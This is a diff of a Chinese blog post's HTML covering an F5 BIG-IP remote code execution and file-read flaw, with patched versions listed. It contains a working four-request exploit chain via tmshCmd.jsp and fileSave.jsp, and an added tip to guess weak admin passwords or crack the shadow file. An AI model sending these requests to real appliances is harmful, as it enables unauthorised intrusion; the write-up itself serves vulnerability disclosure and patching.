@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://www.urso.dog/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Snipaste_2020-07-07_11-30-17.png">
 <meta property="og:image" content="https://www.urso.dog/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Snipaste_2020-07-07_11-44-00.png">
 <meta property="article:published_time" content="2020-07-07T04:23:41.000Z">
-<meta property="article:modified_time" content="2020-07-07T03:53:13.092Z">
+<meta property="article:modified_time" content="2020-07-08T08:21:01.558Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="Big-ip">
 <meta name="twitter:card" content="summary">
@@ -317,7 +317,7 @@
         <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#comments" class="article-comment-link">评论</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 430(字)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 618(字)</span>
 	
 	
 		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 2(分)</span>
@@ -351,14 +351,16 @@
 <p>RCE（能够LFI不一定能RCE，另外此处的代码执行指的是<strong>V11 <em>TMSH</em>命令行</strong>：</p>
 <img src="/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Snipaste_2020-07-07_11-30-17.png" class="" title="This is an image">
 
-<h4 id="执行系统命令："><a href="#执行系统命令：" class="headerlink" title="执行系统命令："></a>执行系统命令：</h4><p>逐次执行以下语句</p>
+<h4 id="执行系统命令："><a href="#执行系统命令：" class="headerlink" title="执行系统命令："></a>执行系统命令：</h4><p>逐次执行以下语句：开启bash-&gt;在可执行目录下创建文件并写入命令-&gt;命令执行-&gt;还原</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bash</span><br><span class="line">fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;id</span><br><span class="line">tmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;cmd</span><br><span class="line">tmshCmd.jsp?command&#x3D;delete+cli+alias+private+list</span><br></pre></td></tr></table></figure>
 
 <img src="/2020/07/07/Big-ip%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/Snipaste_2020-07-07_11-44-00.png" class="" title="This is an image">
 
+<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>部分能够执行文件读取但是不能执行命令的情况，是因为该后台没有初始化，也就是说该后台从未被登录过。而第一步开启bash的功能需要初始化后才可以成功。此处后台的默认账户是<code>admin</code>，密码和系统<code>root</code>密码相同，可以尝试弱口令或者读取shadow文件(一般是没有权限的)解密后登录web端。第一次登录需要强制修改web登录密码，配置完成后登录后台会自动完成初始化。</p>
 <h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>升级至如下版本<br>11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, 15.1.0.4</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://blog.csdn.net/wuyou1995/article/details/107170186/" target="_blank" rel="noopener">https://blog.csdn.net/wuyou1995/article/details/107170186/</a></p>
 <p>2.<a href="https://clouddocs.f5.com/api/tmsh/" target="_blank" rel="noopener">https://clouddocs.f5.com/api/tmsh/</a></p>
+<p>3.<a href="https://mp.weixin.qq.com/s/LczKnV5f7T-0Nw7p4q_0wg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/LczKnV5f7T-0Nw7p4q_0wg</a></p>
 
       
     </div>
